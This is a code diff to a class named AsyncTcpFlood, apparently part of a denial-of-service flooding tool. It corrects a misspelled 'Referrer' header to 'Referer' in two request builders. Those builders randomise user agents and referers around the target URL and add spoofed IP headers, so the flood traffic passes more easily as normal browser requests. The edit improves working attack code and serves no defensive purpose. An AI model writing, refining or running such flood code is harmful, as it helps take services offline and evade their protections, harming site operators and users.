@@ -242,7 +242,7 @@ class AsyncTcpFlood:
     def random_headers(self) -> str:
         return (
             f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referrer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
+            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
             self.spoof_ip()
         )
 
@@ -431,7 +431,7 @@ class AsyncTcpFlood:
             headers=(
                 f"Host: {self._target.authority}\r\n"
                 "User-Agent: null\r\n"
-                "Referrer: null\r\n"
+                "Referer: null\r\n"
                 + self.BASE_HEADERS
                 + self.spoof_ip()
             )
